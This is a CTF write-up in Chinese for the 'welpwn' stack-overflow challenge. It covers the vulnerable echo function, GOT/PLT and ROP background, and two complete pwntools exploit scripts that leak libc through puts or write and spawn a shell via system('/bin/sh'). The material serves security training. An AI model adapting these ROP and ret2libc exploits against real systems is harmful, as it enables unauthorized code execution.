





### welpwn实战操作

这题我认为最大的思考点在于栈的进出、截断以及调试问题。这道题可以很好的进一步熟悉调试操作，以及对泄露libc的过程更熟悉的操作。



#### 程序分析

#### ida现场分析

```
int __fastcall echo(__int64 a1)
{
  char s2[16]; // [rsp+10h] [rbp-10h]

  for ( i = 0; *(_BYTE *)(i + a1); ++i )  #产生截断的地方
    s2[i] = *(_BYTE *)(i + a1);
  s2[i] = 0;
  if ( !strcmp("ROIS", s2) )
  {
    printf("RCTF{Welcome}", s2);
    puts(" is not flag");
  }
  return printf("%s", s2);
}
```

正常的程序执行截断不会存在问题，

除了正常的截断符，程序会在返回地址上被截断，程序正常。但是如果我们想通过栈溢出来控制程序执行rop，那么就需要将考虑到截断符号问题。





#### 补充知识：



1、GOT表；

GOT（Global Offset Table）表中每一项都是本运行模块要引用的一个全局变量或函数的地址。可以用GOT表来间接引用全局变量、函数，也可以把GOT表的首地址作为一个基 准，用相对于该基准的偏移量来引用静态变量、静态函数。由于加载器不会把运行模块加载到固定地址，在不同进程的地址空间中，各运行模块的绝对地址、相对位 置都不同。**这种不同反映到GOT表上，就是每个进程的每个运行模块都有独立的GOT表，所以进程间不能共享GOT表。**

**但是这里存在一个问题，因为printf是在共享库里面的，而共享库在加载的时候是没有固定地址的，所以你不知道它的地址是1000还是2000？怎么办呢？**

于是引入了下面的表plt



2、PLT表；

PLT（Procedure Linkage Table）表每一项都是一小段代码，对应于本运行模块要引用的一个全局函数



3、字节序

p64、p32、u32、u64

用于保证合理的字节型来确定shellcode的正常运行

context.log_level  = 'debug'开启调试信息



4、LibcSeaercher

自导libc库用于寻找我们的libc库/(不同环境的libc使用不同，不排除需要加入爆破操作的可能)

libc = LibcSearcher('write',write_addr)

libc.dump('system')

libc.dump('str_bin_sh')



5、Ropgadget

ROP->返回导向编程

gadget->小程序，小家伙

构造正确的gadget是写出exp的最重要一部，通常ropgadet的难易程序和对于程序突破口的选择是否正确相关。如果没对口，或许也能解出，但是难度会不一样。(。。不排除非预期秒题。。QAQ)

ropgadget可以简单理解成一段汇编的代码，而且通常是存在于程序当中的，我们通过对这些可以相互衔接的汇编代码进行剪切拼接来控制寄存器或者对函数进行调用，从而实现我们的pwn的目的。

https://github.com/JonathanSalwan/ROPgadget



6、函数调用

怎么调用的？原理？



7、地址泄露

栈题中常用的

1. 格式化字符串漏洞泄露
2. 运行流劫持，使用writr、put等函数读出



以上，你已经具备了做题所有的知识！已经可以轻松面对60%的栈的pwn题了~

我们来对程序进行分析调试：



#### 运行和调试操作



#### exp

```
#coding:utf8  
from pwn import *
from LibcSearcher import *

context.log_level  = 'debug'
sh = process('./w')
#sh = remote('111.198.29.45',51867)  
elf = ELF('./w')
write_got = elf.got['write']
puts_plt = elf.plt['puts']
#此处有4条pop指令，用于跳过24字节  
pop_24 = 0x40089C
#pop rdi的地址,用来传参，具体看x64的传参方式  
pop_rdi = 0x4008A3

sh.recvuntil('Welcome to RCTF\n')

main_addr = 0x4007CD
#本题的溢出点在echo函数里,然而，当遇到0，就停止了数据的复制，因此我们需要pop_24来跳过24个字节  
payload = 'a'*0x18 + p64(pop_24) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(main_addr)

sh.send(payload)

sh.recvuntil('\x40')
#泄露write地址  
write_addr = u64(sh.recv(6).ljust(8,'\x00'))

libc = LibcSearcher('write',write_addr)
#获取libc加载地址  
libc_base = write_addr - libc.dump('write')
#获取system地址  
system_addr = libc_base + libc.dump('system')
#获取/bin/sh地址  
binsh_addr = libc_base + libc.dump('str_bin_sh')

sh.recvuntil('\n')
payload = 'a'*0x18 + p64(pop_24) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)

sh.send(payload)
sh.interactive()

```



```
#!/usr/bin/env python
#-*- coding:utf8 -*-
from LibcSearcher import *
from pwn import *

context.log_level = 'debug'
num=16
p=process("./w")
e=ELF("./w")
put=e.symbols["puts"]
write=e.got["write"]
bss=0x601070
pop_rdi=0x00000000004008a3
pppp_ret=0x000000000040089c
ppppp_ret=0x00000000040089a
mov_rdx_rsi_edi=0x0000000000400880
main=e.symbols["main"]
write_plt=e.symbols["write"]
payload='a'*24+p64(pppp_ret)+p64(ppppp_ret)+p64(0)+p64(1)+p64(write)+p64(0x8)+p64(write)+p64(0x1)+p64(mov_rdx_rsi_edi)+'a'*56+p64(main)
pause()
p.recv()
p.sendline(payload)
libc_write=u64(p.recv()[:8])
print(((libc_write)))
libc=LibcSearcher("write",libc_write)
libc_writes=libc.dump("write")
base=libc_write-libc_writes

libc_system=libc.dump("system")
libc_bin=libc.dump("str_bin_sh")+base

print hex(libc_system)
print hex(base)
libc_system=libc_system+base
payload='a'*24+p64(pppp_ret)+p64(pop_rdi)+p64(libc_bin)+p64(libc_system)+p64(main)
p.sendline(payload)
p.interactive()

```

